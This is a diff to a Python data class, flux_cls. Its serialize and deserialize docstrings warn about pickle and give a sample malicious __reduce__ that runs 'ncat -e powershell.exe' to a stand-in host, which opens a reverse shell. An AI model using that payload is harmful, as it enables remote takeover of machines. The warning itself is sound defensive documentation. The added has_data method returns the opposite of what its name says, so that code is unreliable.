@@ -146,6 +146,14 @@ class flux_cls:
 
         return True
 
+    def has_data(self) -> bool:
+        """ check if flux has any rows below header row """
+        for row in self.matrix[1:]:
+            if row:
+                return False
+
+        return True
+
     def has_duplicate_row_pointers(self) -> bool:
         """
         if multiple row.values share pointers to the same underlying list,
@@ -227,7 +235,7 @@ class flux_cls:
                 yield enumrow_nt(i, row)
 
     def to_string(self, encoding=None, **kwargs):
-        """ alias for .to_json """
+        """ alias for .to_json(path=None) """
         return self.to_json(None, encoding, **kwargs)
 
     # region {filesystem methods}
@@ -304,8 +312,18 @@ class flux_cls:
 
     def serialize(self, path, **kwargs):
         """
+        *** SECURITY VULNERABILITY ***
+
         although convenient, pickle introduces significant security flaws
         you should be sure no malicious actors have access to the location of these files
+
+        eg:
+        if your pickle file were replaced with bytes that deserialized into a method
+        like this, you are f*cked
+            def __reduce__(self):
+                import os
+                # gives user root shell, its all over
+                return (os.system, 'ncat -e powershell.exe hacker.man 4444')
         """
         write_file(path, self, filetype='.flux', **kwargs)
         return self
@@ -313,8 +331,18 @@ class flux_cls:
     @classmethod
     def deserialize(cls, path, **kwargs):
         """
+        *** SECURITY VULNERABILITY ***
+
         although convenient, pickle introduces significant security flaws
         you should be sure no malicious actors have access to the location of these files
+
+        eg:
+        if your pickle file were replaced with bytes that deserialized into a method
+        like this, you are f*cked
+            def __reduce__(self):
+                import os
+                # gives user root shell, its all over
+                return (os.system, 'ncat -e powershell.exe hacker.man 4444')
         """
         return read_file(path, filetype='.flux', **kwargs)
     # endregion
